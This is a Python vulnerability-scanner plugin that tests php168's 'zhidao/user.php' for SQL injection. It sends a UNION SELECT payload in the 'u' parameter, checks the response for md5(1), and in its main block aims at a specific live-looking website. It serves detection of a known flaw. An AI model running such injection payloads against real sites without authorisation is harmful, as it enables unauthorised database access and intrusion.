#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = php168 zhidao sql
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-013476

import re

def assign(service, arg):
    if service == 'php168':
        return True, arg

def audit(arg):
    payload = 'zhidao/user.php?j=question&u=-1+union+select+1,2,3,md5(1),5,6,7,8--'
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl(target)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in body:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('php168', 'http://www.chcmcc.com/')[1])